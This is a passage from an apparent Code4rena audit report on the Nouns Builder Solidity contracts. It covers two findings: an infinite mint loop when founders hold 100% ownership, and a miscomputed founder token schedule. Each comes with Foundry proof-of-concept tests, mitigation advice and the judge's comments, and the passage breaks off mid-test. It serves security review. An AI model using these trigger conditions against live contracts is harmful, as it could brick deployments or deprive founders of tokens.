class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Founder</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">founder</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">100</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">founder</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getScheduledRecipient</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">i</span><span class=\"mtk1\"> % </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">.</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">otherUsers</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">.</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">otherUsers</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// // commented out as it will not stop</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//         vm.prank(otherUsers[0]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//         auction.unpause();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>In the proof of concept, there are two founders and they both share 50% of ownership. If the <code>Auction</code> should be <code>unpause</code>d, and therefore triggers to mint tokens, it will go into the infinite loop and eventually revert for out of gas.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Token.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// Cache the auction address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minter</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// Ensure the caller is the auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">148</span><span class=\"mtk1\">         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">minter</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ONLY_AUCTION</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">149</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">150</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// Cannot realistically overflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">         </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">152</span><span class=\"mtk1\">             </span><span class=\"mtk15\">do</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">153</span><span class=\"mtk1\">                 </span><span class=\"mtk3\">// Get the next token to mint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">                 </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">155</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">                 </span><span class=\"mtk3\">// Lookup whether the token is for a founder, and mint accordingly if so</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">157</span><span class=\"mtk1\">             } </span><span class=\"mtk15\">while</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_isForFounder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">158</span><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">159</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">160</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// Mint the next available token to the auction house for bidding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">161</span><span class=\"mtk1\">         </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minter</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">162</span><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_isForFounder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// Get the base token id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseTokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\"> % </span><span class=\"mtk7\">100</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// If there is no scheduled recipient:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">tokenRecipient</span><span class=\"mtk1\">[</span><span class=\"mtk12\">baseTokenId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">             </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">             </span><span class=\"mtk3\">// Else if the founder is still vesting:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenRecipient</span><span class=\"mtk1\">[</span><span class=\"mtk12\">baseTokenId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">vestExpiry</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">187</span><span class=\"mtk1\">             </span><span class=\"mtk3\">// Mint the token to the founder</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">188</span><span class=\"mtk1\">             </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenRecipient</span><span class=\"mtk1\">[</span><span class=\"mtk12\">baseTokenId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">             </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">191</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">192</span><span class=\"mtk1\">             </span><span class=\"mtk3\">// Else the founder has finished vesting:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">193</span><span class=\"mtk1\">         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">             </span><span class=\"mtk3\">// Remove them from future lookups</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">195</span><span class=\"mtk1\">             </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenRecipient</span><span class=\"mtk1\">[</span><span class=\"mtk12\">baseTokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">197</span><span class=\"mtk1\">             </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">198</span><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">199</span><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p>In the <code>Token::mint</code>, there is a while loop which will keep looping as long as <code>_isForFounder</code> returns true. The <code>_isForFounder</code> function will return true is the given <code>_tokenId</code>’s recipient is still vesting. However, to check the recipient it is checking the <code>baseTokenId</code> which is <code>_tokenId % 100</code> (in line 179 above snippet). Which means, if the <code>tokenRecipient</code> of 0 to 99 are currently vesting, it will keep returning true and the while loop in the <code>mint</code> function will not stop. The <code>tokenRecipient</code> was set in the <code>_addFounders</code> and if the sum of all founders’ ownership percent is 100, the <code>tokenRecipient</code> will be filled up to 100.</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use <code>_tokenId</code> instead of <code>baseTokenId</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/347#issuecomment-1257264768\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>While a different typo may have allow to support more than 100 founders and shares setup, the following check:\n<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L179-L180\">Token.sol#L179-L180</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseTokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\"> % </span><span class=\"mtk7\">100</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Will cause each id to be check against the first 100, meaning that if the owners own 100% of all first 100 ids (e.g. the <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L102-L103\"><code>schedule</code></a> value is 1, the code will loop forever in this <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L157-L158\">while loop</a> as no new ID is available</p>\n<p>Because this is contingent on setting admin ownership to 100%, I think Medium Severity to be more appropriate. I wonder if 100% ownership for founders is rational in any case, as no auction would ever happen, however the configuration is allowed and it will brick the contracts.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/347\">iainnash (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-04-founders-can-receive-less-tokens-that-expected\" style=\"position:relative;\"><a href=\"#m-04-founders-can-receive-less-tokens-that-expected\" aria-label=\"m 04 founders can receive less tokens that expected permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/269\">[M-04] Founders can receive less tokens that expected</a></h2>\n<p><em>Submitted by MEP, also found by __141345__, 0xSky, antonttc, azephiar, cccz, CertoraInc, d3e4, datapunk, davidbrai, easy_peasy, hansfriese, hansfriese, MiloTruck, minhtrng, neumo, pcarranzav, peritoflores, PwnPatrol, R2, scaraven, teawaterwire, Tointer, tonisives, unforgiven, V_B, wagmi, zkhorse, and zzzitron</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L118\">Token.sol#L118</a><br></p>\n<p>Because the IDs of the founders tokens are wrongly computed, some of them can have an id higher than 100 and then never be minted.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>If a founder has percentage of <code>pct</code>, then <code>pct</code> IDs between 0 and 99 should be given to him in the mapping <code>tokenRecipient</code>, such that if a token is minted with <code>tokenId % 100</code> equal to one of its IDs, it is minted directly to him. But the modulo is not correctly done at when the mapping is filled, so some IDs of a founder can be higher than 100.</p>\n<p>It happens for example if Alice has 10% and Bob gas 11%. For Alice, <code>schedule</code> is equal to 10, so Alices will have the ids 0, 10, 20, …, 90. But for Bob, <code>schedule</code> is also equal to 9. So it will have the ids 1, 11, 21, …, 91, 100. Indeed, Bob can’t have the ID 0 because it belongs to Alice, same for the ID 10 etc. The last eleventh ID that is given to Bob is 100, that can’t be reached.</p>\n<p>This happens for example when with two founders the percentages verify <code>(100 / pct1) - (100 / pct2) == 1</code>. So (11%, 12%) or (25%, 33%) will behave samely (with more token lost in some case).</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">15</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">TokenTest</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./Token.t.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TestMEP_M1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TokenTest</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUpMEP</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalOwnership</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallets</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">percents</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vestExpiries</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">wallets</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">alice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x0a</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">wallets</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">bob</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x0b</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">percents</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">10</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">percents</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">11</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">totalOwnership</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">percents</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">percents</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vestExpiries</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vestExpiries</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">deployWithCustomFounders</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">percents</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vestExpiries</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Verifies it on the 100 first tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testMEP_M1_1</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalOwnership</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">setUpMEP</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Should mint the 100 first tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Alice should receive 10 tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Bob should receive 11 